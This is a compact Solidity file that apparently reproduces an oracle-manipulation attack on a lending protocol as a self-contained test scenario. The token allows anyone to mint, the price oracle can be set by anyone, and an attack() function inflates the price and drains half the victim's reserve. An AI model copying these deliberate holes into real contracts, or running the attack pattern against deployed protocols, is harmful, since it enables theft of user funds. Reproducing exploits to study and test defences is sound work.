// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
contract RikkeiAsset { mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance; function approve(address a,uint256 n) external returns(bool){allowance[msg.sender][a]=n;return true;} function transferFrom(address f,address t,uint256 n) external returns(bool){require(allowance[f][msg.sender]>=n);allowance[f][msg.sender]-=n;require(balanceOf[f]>=n);balanceOf[f]-=n;balanceOf[t]+=n;return true;} function mint(address a,uint256 n) external {balanceOf[a]+=n;} function transfer(address a,uint256 n) external returns(bool){require(balanceOf[msg.sender]>=n);balanceOf[msg.sender]-=n;balanceOf[a]+=n;return true;} }
contract RikkeiCointroller { RikkeiAsset public immutable asset; uint256 public oraclePrice; address public immutable admin; constructor(RikkeiAsset a){asset=a;admin=msg.sender;}
function setOracleData(address,uint256 p) external { oraclePrice=p; }  function borrow(address to,uint256 n) external { require(oraclePrice>100); asset.transfer(to,n); }
}
contract Scenario { RikkeiAsset public asset; RikkeiCointroller public target; address public victim; uint256 public constant SEED=1000000 ether; constructor(){asset=new RikkeiAsset();target=new RikkeiCointroller(asset);victim=address(target); asset.mint(victim,SEED); asset.mint(address(this),SEED);}
function attack(address receiver) external { target.setOracleData(address(asset),1000000); target.borrow(receiver,SEED/2); }
function reserveBalance() external view returns(uint256){return asset.balanceOf(victim);}
function attackerBalance(address a) external view returns(uint256){return asset.balanceOf(a);}
function assetAddress() external view returns(address){return address(asset);}
}
